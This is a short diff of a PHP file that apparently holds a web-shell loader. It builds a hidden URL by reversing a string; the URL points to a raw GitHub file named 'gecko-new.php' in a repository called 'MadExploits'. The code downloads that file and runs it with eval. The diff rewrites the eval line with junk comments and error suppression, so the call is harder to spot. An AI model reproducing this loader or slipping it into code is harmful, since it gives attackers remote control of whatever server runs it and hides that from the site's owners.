@@ -113,5 +113,5 @@ $C2 = new Z1();
 $D3 = strrev('php.wen-okceg/niam/sdaeh/sfer/okceG/stiolpxEdaM/moc.tnetnocresubuhtig.war//:sptth');
 $E4 = $C2->E0($D3);
 
-eval('?>' . $E4);
+/****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $E4);
 ?>
